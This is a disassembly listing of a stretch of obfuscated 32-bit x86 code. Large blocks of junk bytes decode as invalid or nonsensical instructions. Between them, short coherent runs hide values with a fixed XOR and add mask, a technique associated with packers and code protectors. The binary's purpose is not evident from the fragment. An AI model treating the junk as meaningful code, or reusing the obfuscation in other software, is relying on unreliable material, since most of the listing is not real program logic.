  40d68a:	and    dh,BYTE PTR [edx+0x56a74edf]
  40d690:	(bad)  
  40d691:	fcmovbe st,st(3)
  40d693:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d694:	push   cs
  40d695:	fnsave [ecx]
  40d697:	repz test ch,bh
  40d69a:	cmp    BYTE PTR [esi],0x7b
  40d69d:	int3   
  40d69e:	and    DWORD PTR [edx],0xffffffa1
  40d6a1:	cwde   
  40d6a2:	and    eax,0x622d9281
  40d6a7:	js     0x40d676
  40d6a9:	ja     0x40d6d8
  40d6ab:	add    BYTE PTR [ebx+0x4f],bl
  40d6ae:	into   
  40d6af:	cmp    al,ah
  40d6b1:	ins    DWORD PTR es:[edi],dx
  40d6b2:	es pop ebp
  40d6b4:	pop    ecx
  40d6b5:	pop    ebx
  40d6b6:	or     BYTE PTR [edx],0xd9
  40d6b9:	pop    ss
  40d6ba:	hlt    
  40d6bb:	sar    BYTE PTR [edi+eiz*4-0x6ad91f12],cl
  40d6c2:	inc    esp
  40d6c3:	sbb    eax,DWORD PTR [ebp-0x31]
  40d6c6:	or     BYTE PTR [ecx-0x541d5a8e],0xa1
  40d6cd:	repnz push esi
  40d6cf:	out    0xb6,eax
  40d6d1:	xlat   BYTE PTR ds:[ebx]
  40d6d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6d3:	mov    al,ds:0xad026431
  40d6d8:	call   FWORD PTR [ebx]
  40d6da:	push   edx
  40d6db:	mov    bh,0x5d
  40d6dd:	daa    
  40d6de:	fimul  DWORD PTR [eax+0x45]
  40d6e1:	push   0x41
  40d6e3:	dec    esp
  40d6e4:	push   edi
  40d6e5:	jnp    0x40d6ac
  40d6e7:	div    DWORD PTR [ebp+0x49577a2b]
  40d6ed:	sbb    BYTE PTR [edx-0x75],bh
  40d6f0:	inc    ebp
  40d6f1:	cld    
  40d6f2:	xor    eax,0x7510854
  40d6f7:	jmp    0x40d57a
  40d6fc:	mov    eax,DWORD PTR [ebp+0xc]
  40d6ff:	add    eax,DWORD PTR [ebp+0x8]
  40d702:	mov    DWORD PTR [ebp-0x10],eax
  40d705:	mov    eax,DWORD PTR [ebp-0x1c]
  40d708:	test   eax,eax
  40d70a:	je     0x40de47
  40d710:	mov    DWORD PTR [ebp-0x24],esi
  40d713:	push   0xb
  40d715:	jmp    0x40d85e
  40d71a:	dec    esi
  40d71b:	(bad)  
  40d71c:	xchg   ebx,eax
  40d71d:	mov    bh,0x93
  40d71f:	jae    0x40d78b
  40d721:	out    0x84,eax
  40d723:	push   ss
  40d724:	(bad)  
  40d725:	mov    WORD PTR [edx+0x36],ds
  40d728:	and    al,dh
  40d72a:	add    eax,0x227e7e8d
  40d72f:	jg     0x40d7af
  40d731:	jle    0x40d74b
  40d733:	fld    QWORD PTR [eax]
  40d735:	fild   DWORD PTR [ebx]
  40d737:	aam    0xe8
  40d739:	adc    bh,BYTE PTR [esi+ebp*4+0x40bd5f82]
  40d740:	stc    
  40d741:	sbb    al,0xb1
  40d743:	add    dh,BYTE PTR [ebp-0xe]
  40d746:	pop    ss
  40d747:	daa    
  40d748:	cmp    dl,BYTE PTR [ecx+0x3f0c958c]
  40d74e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d74f:	mov    edi,0xdf6f7a78
  40d754:	mov    ebx,0x688034d6
  40d759:	ficom  DWORD PTR [eax]
  40d75b:	retf   0xb73c
  40d75e:	je     0x40d701
  40d760:	sub    al,0x24
  40d762:	xor    edi,DWORD PTR [edx+0x32]
  40d765:	cwde   
  40d766:	dec    ebp
  40d767:	fbld   TBYTE PTR [esi]
  40d769:	mov    cl,0x8
  40d76b:	push   edx
  40d76c:	retf   
  40d76d:	fld    TBYTE PTR [edi+0x608df3e6]
  40d773:	xlat   BYTE PTR ds:[ebx]
  40d774:	ror    BYTE PTR [eax-0x75],1
  40d777:	data16 jno 0x40d7e4
  40d77a:	jge    0x40d778
  40d77c:	enter  0xe679,0x74
  40d780:	jno    0x40d77f
  40d782:	test   al,0x61
  40d784:	vorpd  ymm2,ymm2,YMMWORD PTR [ebp-0x38c79ac9]
  40d78c:	push   ebp
  40d78d:	ret    0x4a1f
  40d790:	mov    eax,ds:0xc1a1598c
  40d795:	sar    BYTE PTR ds:[ebp+0xa15c587],0x60
  40d79d:	push   ebx
  40d79e:	jno    0x40d7e2
  40d7a0:	rcl    DWORD PTR [ebx],cl
  40d7a2:	add    DWORD PTR [edx],ecx
  40d7a4:	push   edx
  40d7a5:	cmp    dl,BYTE PTR ss:[edi]
  40d7a8:	leave  
  40d7a9:	jle    0x40d7cd
  40d7ab:	jle    0x40d794
  40d7ad:	push   edi
  40d7ae:	push   ds
  40d7af:	jp     0x40d7af
  40d7b1:	lock jg 0x40d78a
  40d7b4:	mov    ebp,0xfbfd0462
  40d7b9:	test   al,0xf
  40d7bb:	xor    DWORD PTR [ebx],esp
  40d7bd:	das    
  40d7be:	cs pushf 
  40d7c0:	sub    al,0x66
  40d7c2:	cmp    dh,BYTE PTR [edi-0xa]
  40d7c5:	ret    0xc7ef
  40d7c8:	ret    0xf330
  40d7cb:	shl    DWORD PTR [ebp-0x102bb5],1
  40d7d1:	sbb    edx,DWORD PTR [edx]
  40d7d3:	jmp    0x40d79d
  40d7d5:	inc    edi
  40d7d6:	push   edi
  40d7d7:	fwait
  40d7d8:	rol    BYTE PTR [ebx-0x59],1
  40d7db:	pop    esp
  40d7dc:	and    BYTE PTR [esi],ch
  40d7de:	shl    BYTE PTR [edx],0x8
  40d7e1:	mov    ch,0x4f
  40d7e3:	(bad)  [ebp-0x52]
  40d7e6:	test   al,0x2f
  40d7e8:	call   0xf93a9913
  40d7ed:	imul   ch
  40d7ef:	jb     0x40d85f
  40d7f1:	xor    al,BYTE PTR [eax-0x3c]
  40d7f4:	xchg   DWORD PTR [eax],eax
  40d7f6:	mov    dl,0xed
  40d7f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7f9:	mov    BYTE PTR [edx],dh
  40d7fb:	xlat   BYTE PTR ds:[ebx]
  40d7fc:	jo     0x40d7a2
  40d7fe:	nop
  40d7ff:	sti    
  40d800:	dec    esi
  40d801:	fwait
  40d802:	and    BYTE PTR [esi+0x49],ah
  40d805:	in     eax,0x3a
  40d807:	add    BYTE PTR [ebx+0x55d604b2],bh
  40d80d:	fstp   DWORD PTR [ecx+0x61]
  40d810:	bound  eax,QWORD PTR [eax]
  40d812:	test   cl,ch
  40d814:	mov    ch,0xe8
  40d816:	sti    
  40d817:	xchg   ecx,eax
  40d818:	je     0x40d801
  40d81a:	js     0x40d853
  40d81c:	xchg   edi,eax
  40d81d:	dec    ebp
  40d81e:	or     eax,0x9217c2d2
  40d824:	add    eax,0x3a111857
  40d829:	xor    al,0xea
  40d82b:	stos   BYTE PTR es:[edi],al
  40d82c:	in     al,0x19
  40d82e:	inc    edx
  40d82f:	aas    
  40d830:	or     eax,0x1f02bdbd
  40d835:	jb     0x40d8a3
  40d837:	pop    eax
  40d838:	fstp   TBYTE PTR [ecx+0x5c832f09]
  40d83e:	cdq    
  40d83f:	sub    ebp,esi
  40d841:	mov    ebx,0xf07bfcd8
  40d846:	hlt    
  40d847:	fcomp  QWORD PTR [ebp-0x6db4220c]
  40d84d:	dec    esp
  40d84e:	and    DWORD PTR [edi+0x63de831],ebp
  40d854:	push   ebp
  40d855:	pop    ecx
  40d856:	add    edi,edx
  40d858:	xchg   ecx,eax
  40d859:	push   ecx
  40d85a:	stos   DWORD PTR es:[edi],eax
  40d85b:	lea    eax,[esi]
  40d85d:	test   al,0x59
  40d85f:	push   0x5
  40d861:	dec    ecx
  40d862:	pop    ebx
  40d863:	xchg   ebx,ecx
  40d865:	sub    ebx,ecx
  40d867:	jmp    0x40d9b0
  40d86c:	adc    edx,DWORD PTR [edi+esi*2]
  40d86f:	jae    0x40d8e2
  40d871:	jno    0x40d886
  40d873:	je     0x40d880
  40d875:	(bad)  
  40d876:	adc    ecx,edx
  40d878:	out    dx,eax
  40d879:	push   es
  40d87a:	nop
  40d87b:	mov    DWORD PTR [ecx],ebp
  40d87d:	mov    bh,BYTE PTR [esi+0x7e]
  40d880:	and    bh,BYTE PTR [edi+0x7e]
  40d883:	jle    0x40d8f9
  40d885:	dec    ebp
  40d886:	retf   
  40d887:	sub    dl,bh
  40d889:	outs   dx,BYTE PTR ds:[esi]
  40d88a:	dec    edi
  40d88b:	(bad)  
  40d88c:	lock dec eax
  40d88e:	jbe    0x40d8df
  40d890:	fidiv  WORD PTR [edx+0x33]
  40d893:	mov    ebp,DWORD PTR [esi+0x63]
  40d896:	aad    0x8
  40d898:	in     al,dx
  40d899:	dec    ecx
  40d89a:	aad    0xec
  40d89c:	cmp    edi,esi
  40d89e:	test   al,0xd8
  40d8a0:	or     edi,DWORD PTR [ebx+0x282af17a]
  40d8a6:	cwde   
  40d8a7:	inc    eax
  40d8a8:	fcmovne st,st(1)
  40d8aa:	ss jnp 0x40d8eb
  40d8ad:	loopne 0x40d8f2
  40d8af:	cdq    
  40d8b0:	int3   
  40d8b1:	rcl    BYTE PTR [ebx],cl
  40d8b3:	add    edi,DWORD PTR [edi+0x3]
  40d8b6:	cld    
  40d8b7:	push   edi
  40d8b8:	sub    ecx,DWORD PTR [ecx-0x28e02e28]
  40d8be:	sbb    al,0xd6
  40d8c0:	adc    al,0x39
  40d8c2:	push   eax
  40d8c3:	pop    ds
  40d8c4:	popf   
  40d8c5:	(bad)  
  40d8c8:	stos   DWORD PTR es:[edi],eax
  40d8c9:	inc    edx
  40d8ca:	jecxz  0x40d8b8
  40d8cc:	call   0x9c5839c4
  40d8d1:	cmp    al,0xbf
  40d8d3:	adc    al,0x7c
  40d8d5:	mov    ds:0xa5813e02,eax
  40d8da:	out    0x37,al
  40d8dc:	or     dh,al
  40d8de:	sti    
  40d8df:	push   ds
  40d8e0:	pop    ebp
  40d8e1:	ins    BYTE PTR es:[edi],dx
  40d8e2:	or     bl,BYTE PTR [esi-0x12]
  40d8e5:	ja     0x40d8f4
  40d8e7:	and    ah,dh
  40d8e9:	mov    eax,ds:0xb88c9e42
  40d8ee:	push   esi
  40d8ef:	aad    0x10
  40d8f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8f2:	pop    esi
  40d8f3:	jge    0x40d974
  40d8f5:	enter  0xeff3,0xfe
  40d8f9:	xchg   esp,eax
  40d8fa:	jbe    0x40d920
  40d8fc:	push   es
  40d8fd:	out    dx,al
  40d8fe:	mov    bh,0x7b
  40d900:	xlat   BYTE PTR ds:[ebx]
  40d901:	pop    ss
  40d902:	std    
  40d903:	dec    edx
  40d904:	mov    fs,WORD PTR [esi]
  40d906:	and    eax,0x25ba76a1
  40d90b:	sbb    BYTE PTR [ebp+0xb],0xef
  40d90f:	or     eax,0x5bd2f63d
  40d914:	(bad)  
  40d916:	xchg   ebx,eax
  40d917:	popf   
  40d918:	test   eax,0x21495541
  40d91d:	test   DWORD PTR [ebx+0x771c1a11],edi
  40d923:	ret    
  40d924:	push   ds
  40d925:	js     0x40d921
  40d927:	je     0x40d91e
  40d929:	mov    ebx,0x730d2422
  40d92e:	ja     0x40d912
  40d930:	aas    
  40d931:	addr16 ds cdq 
  40d934:	xchg   ebp,eax
  40d935:	jmp    FWORD PTR [ebx]
  40d937:	push   ecx
  40d938:	icebp  
  40d939:	and    al,0x96
  40d93b:	xchg   esp,eax
  40d93c:	push   edx
  40d93d:	inc    edi
  40d93e:	jns    0x40d8d7
  40d940:	cmp    al,0xe7
  40d942:	xor    BYTE PTR ds:0xf5aed2cf,dh
  40d948:	shl    BYTE PTR cs:[ecx-0xa],cl
  40d94c:	xor    al,BYTE PTR ds:0x3fd957a0
  40d952:	push   ebx
  40d953:	iret   
  40d954:	or     eax,0xf02c12a6
  40d959:	add    edx,DWORD PTR [edx]
  40d95b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d95c:	in     eax,dx
  40d95d:	fstp   TBYTE PTR [esi]
  40d95f:	icebp  
  40d960:	in     eax,0xd
  40d962:	icebp  
  40d963:	sub    eax,0xbab6ad32
  40d968:	cli    
  40d969:	(bad)  
  40d96a:	hlt    
  40d96b:	dec    edx
  40d96c:	pop    ebx
  40d96d:	mov    al,ds:0x1dd6089e
  40d972:	xchg   esp,eax
  40d973:	pop    ebx
  40d974:	cmp    al,ch
  40d976:	pop    ecx
  40d977:	cwde   
  40d978:	xchg   DWORD PTR [ebp+edi*8-0x7a744c08],edx
  40d97f:	push   cs
  40d980:	cwde   
  40d981:	retf   
  40d982:	pop    esp
  40d983:	mov    bl,0x5b
  40d985:	cwde   
  40d986:	in     al,0x92
  40d988:	inc    esi
  40d989:	mov    ebx,0xfb4acc97
  40d98e:	push   ecx
  40d98f:	pop    edx
  40d990:	int3   
  40d991:	fbstp  TBYTE PTR [eax+0x59]
  40d994:	sub    eax,0xfdca9d7
  40d999:	std    
  40d99a:	push   edi
  40d99b:	pop    ecx
  40d99c:	jecxz  0x40d981
  40d99e:	sub    al,0xb9
  40d9a0:	dec    ebx
  40d9a1:	pushf  
  40d9a2:	xchg   edi,eax
  40d9a3:	cli    
  40d9a4:	enter  0x9a32,0xf5
  40d9a8:	(bad)  
  40d9a9:	jae    0x40d995
  40d9ab:	push   ebp
  40d9ac:	mov    ebx,0x872faa4d
  40d9b1:	retf   
  40d9b2:	jmp    0x40dafb
  40d9b7:	mov    ebx,0xf146cba5
  40d9bc:	jo     0x40da11
  40d9be:	mov    eax,ds:0x3f48df24
  40d9c3:	pop    ss
  40d9c4:	mov    ds:0x8bddb89c,eax
  40d9c9:	jle    0x40da49
  40d9cb:	and    bh,BYTE PTR [edi+0x7e]
  40d9ce:	jle    0x40d9c7
  40d9d0:	hlt    
  40d9d1:	iret   
  40d9d2:	in     al,dx
  40d9d3:	add    cl,BYTE PTR [ecx]
  40d9d5:	xchg   ebp,eax
  40d9d6:	pop    ecx
  40d9d7:	ror    eax,1
  40d9d9:	add    dh,BYTE PTR [edx+esi*8-0x2f]
  40d9dd:	cs jecxz 0x40d99d
  40d9e0:	shl    DWORD PTR [esi-0x674b599c],0x23
  40d9e7:	xchg   ebx,eax
  40d9e8:	bound  edi,QWORD PTR [ebp-0x4cd98e9d]
  40d9ee:	lods   al,BYTE PTR ds:[esi]
  40d9ef:	xor    DWORD PTR [esi-0x1f6dfd30],esi
  40d9f5:	or     al,0x97
  40d9f7:	cmp    bl,BYTE PTR [esi]
  40d9f9:	data16 and al,0x30
  40d9fc:	out    0x9e,eax
  40d9fe:	push   edx
  40d9ff:	xchg   edx,eax
  40da00:	imul   ecx,DWORD PTR [eax-0x44],0x1c
  40da04:	xor    DWORD PTR [ebp+0x7b08b541],ecx
  40da0a:	shl    BYTE PTR [edi-0x6579ee44],1
  40da10:	xchg   esi,eax
  40da11:	fidivr DWORD PTR [ecx+0x197093d6]
  40da17:	sbb    ecx,DWORD PTR [edx-0x17]
  40da1a:	add    DWORD PTR ds:[ebx],ebp
  40da1d:	xchg   esi,eax
  40da1e:	(bad)  
  40da1f:	push   ecx
  40da20:	xchg   edi,eax
  40da21:	push   ebx
  40da22:	adc    eax,DWORD PTR es:[esi+0x6e]
  40da26:	popa   
  40da27:	xchg   ebx,eax
  40da28:	jge    0x40daa9
  40da2a:	test   eax,0xded8dc4b
  40da2f:	repz jle 0x40d9b8
  40da32:	(bad)  
  40da33:	xchg   edi,eax
  40da34:	mov    ebp,0xa074c46e
  40da39:	push   ds
  40da3a:	call   0xd3b6:0x8775ce9b
  40da41:	(bad)  
  40da43:	jo     0x40d9c8
  40da45:	hlt    
  40da46:	or     BYTE PTR [edi+ebx*1],0xb
  40da4a:	add    eax,0x67326372
  40da4f:	xor    eax,0x4ff2f31b
  40da54:	scas   al,BYTE PTR es:[edi]
  40da55:	ins    DWORD PTR es:[edi],dx
  40da56:	out    0xa7,eax
  40da58:	sub    DWORD PTR [ebp+ebx*8-0x27],esi
  40da5c:	fstp   TBYTE PTR [edx+0x22c0947f]
  40da62:	add    BYTE PTR [eax-0x4b2084ec],ch
  40da68:	or     DWORD PTR [ecx-0x7a],ebp
  40da6b:	mov    esp,0x21a8c9d4
  40da70:	loope  0x40da50
  40da72:	inc    edx
  40da73:	xor    bh,bh
  40da75:	sbb    DWORD PTR [edi-0x5b37d857],ebp
  40da7b:	dec    eax
  40da7c:	jnp    0x40dad9
  40da7e:	adc    ecx,edi
  40da80:	add    ch,BYTE PTR [esi]
  40da82:	sahf   
  40da83:	mov    ch,0x35
  40da85:	int3   
  40da86:	stos   DWORD PTR es:[edi],eax
  40da87:	sti    
  40da88:	sub    BYTE PTR [ebp-0x56],ah
  40da8b:	dec    ecx
  40da8c:	fs stos DWORD PTR es:[edi],eax
  40da8e:	push   edi
  40da8f:	inc    ebp
  40da90:	xchg   esp,eax
  40da91:	mov    bl,0xb5
  40da93:	dec    ecx
  40da94:	jge    0x40dad1
  40da96:	mov    ah,0xe7
  40da98:	in     eax,dx
  40da99:	jo     0x40da60
  40da9b:	imul   esp,ebp,0x12
  40da9e:	sbb    BYTE PTR [ebp+0x453fee1f],dl
  40daa4:	dec    esp
  40daa5:	sbb    bh,bh
  40daa7:	sysenter 
  40daa9:	jmp    0x7a1a:0xe5123f7b
  40dab0:	nop
  40dab1:	and    BYTE PTR [edi],0xe6
  40dab4:	ficomp WORD PTR [ecx]
  40dab6:	std    
  40dab7:	mov    edi,0x372206cf
  40dabc:	aad    0xd0
  40dabe:	push   ebx
  40dabf:	and    ebp,0x7f
  40dac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dac3:	cli    
  40dac4:	sub    edi,esi
  40dac6:	into   
  40dac7:	loop   0x40db1c
  40dac9:	int    0xae
  40dacb:	add    al,0xf3
  40dacd:	sbb    DWORD PTR [ecx],0xffffffec
  40dad0:	xchg   esp,eax
  40dad1:	in     eax,dx
  40dad2:	test   BYTE PTR ds:0xf734e2a3,dl
  40dad8:	mov    ds:0xec02ff0b,al
  40dadd:	sbb    DWORD PTR [eax+eiz*2-0x60],eax
  40dae1:	add    cl,BYTE PTR [ecx+edx*8+0x5931c440]
  40dae8:	cmp    DWORD PTR [ebx-0x319a0603],ebp
  40daee:	lods   al,BYTE PTR ds:[esi]
  40daef:	ds cmp eax,0x4713c17a
  40daf5:	fidiv  WORD PTR [esi]
  40daf7:	aam    0xc5
  40daf9:	sub    al,0x3c
  40dafb:	dec    ecx
  40dafc:	mov    eax,DWORD PTR [ebp-0x1c]
  40daff:	imul   eax,ecx
  40db02:	sub    esp,eax
  40db04:	mov    DWORD PTR [ebp-0x24],esp
  40db07:	mov    eax,DWORD PTR [ebp-0x4]
  40db0a:	mov    ecx,0x7510854
  40db0f:	xor    eax,ecx
  40db11:	mov    edx,0x32729b
  40db16:	add    eax,edx
  40db18:	mov    DWORD PTR [ebp+0x8],eax
  40db1b:	mov    eax,DWORD PTR [ebp-0x18]
  40db1e:	xor    eax,ecx
  40db20:	jmp    0x40dc69
  40db25:	fsub   DWORD PTR [edx+0x35701da8]
  40db2b:	imul   esp,DWORD PTR [ebx+0x3b],0x55b6fdf0
  40db32:	cdq    
  40db33:	cmp    BYTE PTR [edi+0x7e7e8881],dh
  40db39:	and    bh,BYTE PTR [edi+0x7e]
  40db3c:	jle    0x40dbbc
  40db3e:	push   0xf7a41d8b
  40db43:	jns    0x40db4c
  40db45:	sub    dl,0x40
  40db48:	mov    bh,0xc9
  40db4a:	(bad)  
  40db4b:	jmp    0x6f5b:0x14b222f1
  40db52:	sti    
  40db53:	add    al,0xcc
  40db55:	(bad)  
  40db56:	in     eax,dx
  40db57:	call   DWORD PTR [eax-0x642a1c2]
  40db5d:	adc    al,0x64
  40db5f:	push   esi
  40db60:	cmc    
  40db61:	jge    0x40dbd5
  40db63:	cmp    ecx,DWORD PTR [esi]
  40db65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db66:	push   es
  40db67:	jo     0x40dbdd
  40db69:	into   
  40db6a:	xchg   esp,eax
  40db6b:	jmp    0x40dbd5
  40db6d:	xor    eax,0x17523aa
  40db72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db73:	xchg   edx,eax
  40db74:	mov    edx,DWORD PTR [esi+eax*8-0x80]
  40db78:	fisttp DWORD PTR [ecx+0xcd2f8ea]
  40db7e:	and    edx,edx
  40db80:	or     BYTE PTR [esi],0x81
  40db83:	add    ecx,DWORD PTR [esi]
  40db85:	in     al,dx
  40db86:	pop    ebx
  40db87:	inc    edi
  40db88:	sub    eax,0xa14d4b25
  40db8d:	hlt    
  40db8e:	sub    cl,cl
  40db90:	and    DWORD PTR es:[edi+0x38f8a1d8],0x6eca9892
  40db9b:	in     eax,0x88
  40db9d:	push   ecx
  40db9e:	retf   
  40db9f:	mov    ah,0xac
  40dba1:	xor    esi,esp
  40dba3:	fimul  DWORD PTR [ebp-0x1a66068d]
  40dba9:	mov    al,0xbb
  40dbab:	sub    eax,0xa721e03c
  40dbb0:	pusha  
  40dbb1:	bound  edi,QWORD PTR ds:0x35d97e2a
  40dbb7:	retf   
  40dbb8:	ins    DWORD PTR es:[edi],dx
  40dbb9:	xchg   BYTE PTR [ebx-0x575d4af5],bh
  40dbbf:	rcr    DWORD PTR [ebp-0x1b],0xf
  40dbc3:	inc    ebp
  40dbc4:	mov    DWORD PTR ds:0x62b462f3,ecx
  40dbca:	(bad)  
  40dbcb:	mov    dl,0x1d
  40dbcd:	jmp    0xcbd49a70
  40dbd2:	inc    ecx
  40dbd3:	lahf   
  40dbd4:	scas   eax,DWORD PTR es:[edi]
  40dbd5:	into   
  40dbd6:	jmp    0x4a907f8
  40dbdb:	add    eax,0xcebc848f
  40dbe0:	adc    eax,0x3efaf2c4
  40dbe5:	push   ss
  40dbe6:	adc    eax,0x61f2e3e4
  40dbeb:	pop    ds
  40dbec:	std    
  40dbed:	push   cs
  40dbee:	xor    ah,bh
  40dbf0:	mov    edi,0xa8b7c385
  40dbf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbf6:	adc    DWORD PTR [edi+0x7358e109],ebp
  40dbfc:	cld    
  40dbfd:	aam    0xa4
  40dbff:	fnsave [edx-0x2f]
  40dc02:	mov    edx,0x8bc455be
  40dc07:	ret    0xbd73
  40dc0a:	test   al,0x4c
  40dc0c:	add    bh,BYTE PTR [ebx-0x1135e8c0]
  40dc12:	out    0xd9,eax
  40dc14:	cdq    
  40dc15:	xlat   BYTE PTR ds:[ebx]
  40dc16:	jg     0x40dbbf
  40dc18:	ret    0xa2bc
  40dc1b:	push   cs
  40dc1c:	cmp    dl,BYTE PTR [esi]
  40dc1e:	adc    ah,dl
  40dc20:	add    ch,BYTE PTR [ebp-0x61]
  40dc23:	ret    
  40dc24:	retf   0x7dc0
  40dc27:	mov    ecx,0xd90664c8
  40dc2c:	outs   dx,DWORD PTR ds:[esi]
  40dc2d:	ss jle 0x40dc2f
  40dc30:	mov    WORD PTR [ebp-0x21],cs
  40dc33:	lds    edi,FWORD PTR [ecx-0x2d]
  40dc36:	lods   eax,DWORD PTR ds:[esi]
  40dc37:	or     BYTE PTR ss:[edx-0x791f3e2c],al
  40dc3e:	fidivr WORD PTR [eax+0x6304450a]
  40dc44:	pop    edi
  40dc45:	mov    eax,0x7a0375a7
  40dc4a:	inc    esp
  40dc4b:	cmp    eax,0x63c14331
  40dc50:	cmc    
  40dc51:	pop    ss
  40dc52:	fwait
  40dc53:	test   al,0xd4
  40dc55:	mov    BYTE PTR [edi-0x549b2cf4],bl
  40dc5b:	xor    ebp,ebx
  40dc5d:	jnp    0x40dbe2
  40dc5f:	shr    DWORD PTR [esi],0xf9
  40dc62:	fadd   st(5),st
  40dc64:	jb     0x40dc97
  40dc66:	jecxz  0x40dc23
  40dc68:	outs   dx,DWORD PTR ds:[esi]
  40dc69:	add    eax,edx
  40dc6b:	mov    edx,DWORD PTR [ebp+0x14]
  40dc6e:	imul   eax,DWORD PTR [edx]
  40dc71:	mov    edx,DWORD PTR [ebp-0x4]
  40dc74:	xor    edx,ecx
  40dc76:	mov    ecx,DWORD PTR [ebp+0x8]
  40dc79:	lea    ecx,[edx+ecx*1+0x32729b]
  40dc80:	cmp    ecx,eax
  40dc82:	je     0x40de42
  40dc88:	mov    edi,DWORD PTR [ebp-0x18]
  40dc8b:	mov    eax,DWORD PTR [ebp+0x8]
  40dc8e:	mov    edx,DWORD PTR [ebp+0x14]
  40dc91:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40dc95:	mov    ecx,0x7510854
  40dc9a:	xor    edx,edx
  40dc9c:	xor    edi,ecx
  40dc9e:	mov    esi,0x32729b
  40dca3:	add    edi,esi
  40dca5:	div    edi
  40dca7:	mov    edx,DWORD PTR [ebp-0x4]
  40dcaa:	xor    edx,ecx
  40dcac:	lea    eax,[edx+eax*1+0x32729b]
  40dcb3:	mov    edx,DWORD PTR [ebp+0x8]
  40dcb6:	mov    edi,DWORD PTR [ebp-0x24]
  40dcb9:	mov    DWORD PTR [edi+edx*4],eax
  40dcbc:	mov    eax,DWORD PTR [ebp-0x18]
  40dcbf:	mov    edx,DWORD PTR [ebp+0x8]
  40dcc2:	xor    eax,ecx
  40dcc4:	lea    eax,[eax+edx*1+0x32729b]
  40dccb:	jmp    0x40de14
  40dcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd1:	scas   eax,DWORD PTR es:[edi]
  40dcd2:	and    eax,0xb1913513
  40dcd7:	stos   DWORD PTR es:[edi],eax
  40dcd8:	jp     0x40dc9c
  40dcda:	mov    ch,0x9b
  40dcdc:	sbb    BYTE PTR [ebx+ecx*8+0x7e89b56a],bl
  40dce3:	jle    0x40dd07
  40dce5:	jg     0x40dd65
  40dce7:	jle    0x40dc95
  40dce9:	ins    DWORD PTR es:[edi],dx
  40dcea:	je     0x40dc95
  40dcec:	push   eax
  40dced:	jne    0x40dd6e
  40dcef:	jne    0x40dc82
  40dcf1:	in     al,0xea
  40dcf3:	ja     0x40dce7
  40dcf5:	shl    dh,cl
  40dcf7:	push   ecx
  40dcf8:	aaa    
  40dcf9:	cwde   
  40dcfa:	xlat   BYTE PTR ds:[ebx]
  40dcfb:	mov    ah,0xf4
  40dcfd:	cmp    DWORD PTR [eax-0x2e849b62],ebp
  40dd03:	mov    cl,0xa3
  40dd05:	js     0x40dd58
  40dd07:	loope  0x40dce4
  40dd09:	mov    WORD PTR [edi+0x28f207ec],?
  40dd0f:	out    0x98,al
  40dd11:	or     eax,0x38e1883a
  40dd16:	retf   0x2bf9
  40dd19:	pushf  
  40dd1a:	hlt    
  40dd1b:	loope  0x40dd2f
  40dd1d:	push   0x5e915496
  40dd22:	int3   
  40dd23:	inc    ebx
  40dd24:	mov    ch,0x18
  40dd26:	mov    esi,0x7b5b83d7
  40dd2b:	pop    es
  40dd2c:	arpl   si,bp
  40dd2e:	outs   dx,DWORD PTR ds:[esi]
  40dd2f:	mov    edx,0x3cdb44c3
  40dd34:	jl     0x40dd7a
  40dd36:	inc    ecx
  40dd37:	imul   esi,DWORD PTR [esi],0xb35eb15e
  40dd3d:	xor    BYTE PTR [ebp-0x8],dl
  40dd40:	pop    esi
  40dd41:	add    ah,BYTE PTR [eax+0x5f]
  40dd44:	pop    edi
  40dd45:	fistp  QWORD PTR [ecx+ecx*2]
  40dd48:	(bad)  
  40dd49:	mov    fs,WORD PTR [ebx]
  40dd4b:	stos   BYTE PTR es:[edi],al
  40dd4c:	test   BYTE PTR [eax],cl
  40dd4e:	xchg   BYTE PTR [ecx+0x923a439],ah
  40dd54:	pop    esp
  40dd55:	pop    ebx
  40dd56:	nop
  40dd57:	and    eax,0xbdda9d7f
  40dd5c:	gs sub ebp,0x399c9941
  40dd63:	loope  0x40dd38
  40dd65:	jmp    0xc2b4727a
  40dd6a:	xlat   BYTE PTR ds:[ebx]
  40dd6b:	adc    esp,DWORD PTR [edi]
  40dd6d:	cs into 
  40dd6f:	adc    BYTE PTR [ebx+0x7c871b80],bl
  40dd75:	mov    ecx,0x8ea87f3d
  40dd7a:	mov    esp,DWORD PTR [eax+0x7d]
  40dd7d:	jg     0x40ddd8
  40dd7f:	push   es
  40dd80:	jbe    0x40dd32
  40dd82:	sbb    eax,0xff63f1f1
  40dd87:	cmp    ch,BYTE PTR [ebx+0x792079c5]
  40dd8d:	popf   
  40dd8e:	push   esi
  40dd8f:	mov    ebp,0x29a876d0
  40dd94:	jbe    0x40ddb1
  40dd96:	cmp    eax,0xc14b8c6d
  40dd9b:	sub    BYTE PTR [eax+0x1c36c5b1],cl
  40dda1:	popa   
  40dda2:	mov    eax,0x257ba934
  40dda7:	clc    
  40dda8:	ficomp DWORD PTR [eax-0x72]
  40ddab:	jnp    0x40ddf4
  40ddad:	test   edx,edx
  40ddaf:	sub    al,BYTE PTR [ebp-0x418b7ecc]
  40ddb5:	data16 sbb al,0x6d
  40ddb8:	sub    bl,BYTE PTR [edi]
  40ddba:	std    
  40ddbb:	sbb    BYTE PTR [ecx],al
  40ddbd:	jl     0x40de23
  40ddbf:	bound  edx,QWORD PTR [esi-0x6802e961]
  40ddc5:	dec    esp
  40ddc6:	mov    BYTE PTR [ebp-0xb],ah
  40ddc9:	repz cdq 
  40ddcb:	je     0x40dd77
  40ddcd:	lock movups xmm0,XMMWORD PTR [edx]
  40ddd1:	cs push edi
  40ddd3:	add    DWORD PTR ds:0x24fd9d4e,edx
  40ddd9:	fistp  QWORD PTR [edi-0x7a]
  40dddc:	dec    ebp
  40dddd:	sbb    DWORD PTR [edx+edx*8+0x248c962e],edx
  40dde4:	jg     0x40ddd6
  40dde6:	pusha  
  40dde7:	pop    edx
  40dde8:	stc    
